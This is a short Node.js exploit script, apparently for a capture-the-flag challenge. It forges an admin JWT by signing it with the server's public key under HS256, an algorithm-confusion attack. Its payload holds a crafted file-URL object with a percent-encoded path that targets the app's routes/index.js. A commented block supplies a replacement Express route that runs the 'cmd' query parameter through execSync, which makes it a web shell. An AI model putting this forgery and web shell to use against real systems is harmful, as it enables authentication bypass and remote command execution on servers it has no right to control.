// https://mp.weixin.qq.com/s/vke8X24-G5wLB1vxzc3zCw

var jwt = require("jsonwebtoken");
var fs = require("fs");
payload = {
  isAdmin: true,
  username: "admin",
  home: { "href": "ank1e", "origin": "ank1e", "protocol":
  "file:", "hostname": "",
  "pathname": "/app/%72%6f%75%74%65%73/index.%6a%73" }
}
var publicKey = fs.readFileSync('./public.pem');
var token = jwt.sign(payload, publicKey, { algorithm: "HS256" });
console.log(token)


// 构造一个index.js，写入一个execSync
/*

var express = require('express');
const execSync = require('child_process').execSync;
var router = express.Router();
router.get('/', function(req, res, next) {
  // res.render('index', { title: 'HackThisBox' });
  var cmd = execSync(req.query.cmd);
  res.send(cmd.toString());
});
module.exports = router;

*/